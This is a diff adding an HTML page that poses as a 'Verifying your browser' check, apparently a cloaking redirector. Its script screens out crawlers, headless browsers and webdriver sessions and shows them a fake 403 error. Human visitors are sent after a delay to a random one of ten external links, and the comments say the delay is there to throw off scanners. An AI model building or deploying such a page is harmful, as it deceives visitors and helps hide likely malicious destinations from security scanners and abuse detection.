@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Secure Connection...</title>
+    <script>
+        function checkAndRedirect() {
+            // Твой список из 10 ссылок
+            var targetUrls = [
+                "https://thetastarfashion.com/nfqv",
+                "https://hardhatprotect.com/jell",
+                "https://mammbypranallc.com/ku5e",
+                "https://rigidconstr.com/aj4z",
+                "https://hardhatprotect.com/mokf",
+                "https://aarrinfclaimspecialist.com/ddva",
+                "https://huppmusic.com/r4xd",
+                "https://keysitc.com/j4z8",
+                "https://susant.net/rvn0",
+                "https://icontrollo.com/bnhe"
+            ];
+
+            // 1. Простейшая проверка на ботов (User-Agent и параметры браузера)
+            var ua = navigator.userAgent.toLowerCase();
+            var bots = ["bot", "spider", "googlebot", "crawler", "headless", "slurp", "ia_archiver"];
+            var isBot = bots.some(function(bot) { return ua.indexOf(bot) !== -1; });
+            
+            // Проверка на автоматизированное управление (Webdriver)
+            var isAutomation = navigator.webdriver || !navigator.languages || navigator.languages.length === 0;
+
+            // Проверка на реальный размер экрана (боты часто имеют 0x0)
+            var isRealScreen = (window.screen.width > 300 && window.screen.height > 300);
+
+            // 2. Если все проверки пройдены (похож на человека)
+            if (!isBot && !isAutomation && isRealScreen) {
+                // Выбираем случайную ссылку из списка
+                var randomIndex = Math.floor(Math.random() * targetUrls.length);
+                var finalUrl = targetUrls[randomIndex];
+
+                // Делаем редирект с небольшой задержкой (800мс), чтобы сбить сканеры
+                setTimeout(function() {
+                    // Добавляем случайный хвост для уникальности перехода
+                    var separator = finalUrl.indexOf('?') !== -1 ? '&' : '?';
+                    window.location.href = finalUrl + separator + "sid=" + Math.random().toString(36).substring(7);
+                }, 800);
+            } else {
+                // Что видит бот или подозрительный запрос
+                document.getElementById("status").innerHTML = "<h3>Error 403</h3><p>Access denied. Please check your internet connection and try again.</p>";
+            }
+        }
+
+        window.onload = checkAndRedirect;
+    </script>
+</head>
+<body style="font-family: 'Segoe UI', Arial, sans-serif; background-color: #f9f9f9; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
+    <div id="status" style="text-align: center; border: 1px solid #eee; background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 400px;">
+        <div style="margin-bottom: 20px;">
+            <div style="display: inline-block; width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+        </div>
+        <p style="font-size: 18px; font-weight: 500;">Verifying your browser...</p>
+        <p style="font-size: 14px; color: #888;">This process is automatic. Please wait a moment.</p>
+    </div>
+
+    <style>
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</body>
+</html>
